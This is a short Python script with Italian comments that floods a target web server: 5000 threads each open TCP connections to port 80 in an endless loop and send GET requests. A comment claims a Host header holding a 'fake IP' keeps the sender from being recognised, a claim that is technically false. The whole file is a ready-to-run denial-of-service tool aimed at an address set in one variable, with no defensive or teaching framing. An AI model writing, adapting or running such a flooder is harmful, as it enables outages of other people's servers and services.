import socket
import threading

#inseriamo l'ip del sito da colpire
target = '192.168.1.190'
port = 80
fake_ip = '182.21.21.32' #IP finto per non essere riconosciuto


attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        print(attack_num)
        
        s.close()


#Serve a simulare più attacchi in contemporanea
for i in range(5000):
    thread = threading.Thread(target=attack)
    thread.start()

